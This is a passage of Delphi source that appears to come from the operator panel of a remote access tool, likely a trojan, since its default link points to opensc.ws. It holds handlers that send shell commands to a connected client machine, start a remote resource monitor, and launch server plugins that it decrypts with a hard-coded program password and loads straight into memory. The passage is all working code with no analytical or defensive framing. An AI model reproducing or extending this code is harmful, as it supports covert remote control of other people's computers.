  TmpStr: string;
begin
  TmpStr := 'http://www.opensc.ws';
  if not InputQuery('Open web page', 'Link', TmpStr) then Exit;
  Client.SendDatas(EXECUTESHELLCOMMAND + '|start ' + TmpStr);
  AddSentLog('Open web page ' + TmpStr);
end;

procedure TFormManager.chk1Click(Sender: TObject);
begin
  if chk1.Checked then
  begin
    tmr1.Enabled := True;
    AddSentLog('Start resources monitor');
  end
  else
  begin
    tmr1.Enabled := False;
    AddLog('[INFO]', 'Resources monitor stopped', -1, clBlack);
    g1.Progress := 0;                                         
    g2.Progress := 0;
  end;
end;

procedure TFormManager.btn7Click(Sender: TObject);
var
  TmpForm: TFormNotes;
begin
  if Client.Forms[18] <> nil then TFormNotes(Client.Forms[18]).Show else
  begin
    TmpForm := TFormNotes.Create(Self, Client);
    Client.Forms[18] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone;
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.L1Click(Sender: TObject);
begin
  if not Assigned(lvPlugins.Selected) then Exit;
  Client.SendDatas(CUSTOMPLUGINSTART + '|' + lvPlugins.Selected.SubItems[4]);
end;
        
procedure TFormManager.AddPlugin(pPath: string);
var
  Module: PBTMemoryModule;
  TmpItem: TListItem;
  TmpList: TStringArray;
  Buffer, TmpStr, TmpStr1: string;
  p: Pointer;
  PluginInfos: function(): PChar;
  BufferSize: Int64;
  jpg: TJPEGImage;
  Bmp: TBitmap;
  Stream: TMemoryStream;
begin
  Buffer := FileToStr(pPath);
  BufferSize := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));
  Delete(Buffer, 1, Pos('|', Buffer));
  TmpStr1 := Copy(Buffer, 1, BufferSize);                  
  Delete(Buffer, 1, BufferSize); 
  Buffer := EnDecryptText(Buffer, PROGRAMPASSWORD);
  p := @Buffer[1];

  try
    Module := BTMemoryLoadLibary(p, Length(Buffer));
    @PluginInfos := BTMemoryGetProcAddress(Module, 'PluginInfos');
    if Assigned(PluginInfos) then TmpStr := PluginInfos();
    TmpList := ParseString('|', TmpStr);

    lvPlugins.Items.BeginUpdate;

    TmpItem := lvPlugins.Items.Add;
    TmpItem.Caption := pPath;
    TmpItem.SubItems.Add(TmpList[0]);
    TmpItem.SubItems.Add(TmpList[1]);
    TmpItem.SubItems.Add(TmpList[2]);
    TmpItem.SubItems.Add(TmpList[3]);     
    TmpItem.SubItems.Add(TmpList[5]);

    Stream := TMemoryStream.Create;
    Stream.Write(Pointer(TmpStr1)^, Length(TmpStr1));
    Stream.Position := 0;

    try
      Jpg := TJPEGImage.Create;
      Jpg.LoadFromStream(Stream);
      Stream.Free;
      Bmp := TBitmap.Create;
      Bmp.Width := Jpg.Width;
      Bmp.Height := Jpg.Height;
      Bmp.Canvas.Draw(0, 0, Jpg);
      Jpg.Free;
    except
      Stream.Free;
      Jpg.Free;
      Bmp.Free;
      Exit;
    end;

    TmpItem.ImageIndex := il3.Add(Bmp, nil);
    Bmp.Free;

    lvPlugins.Items.EndUpdate;
  finally
    BTMemoryFreeLibrary(Module);
  end;
end;

procedure TFormManager.btn1Click(Sender: TObject);
begin
  lvPlugins.BringToFront;
end;

procedure TFormManager.R2Click(Sender: TObject);
var
  i: Integer;
begin
  lvPlugins.Clear;
  if FormPluginsManager.lv1.Items.Count = 0 then Exit;
  for i := 0 to FormPluginsManager.lv1.Items.Count - 1 do
  begin
    Application.ProcessMessages;
    if FormPluginsManager.lv1.Items.Item[i].SubItems[0] = 'Server' then
    AddPlugin(FormPluginsManager.lv1.Items.Item[i].Caption);
  end;
end;

procedure TFormManager.lvLogsCustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then Sender.Canvas.Font.Color := TColor(Item.Data);
end;

end.
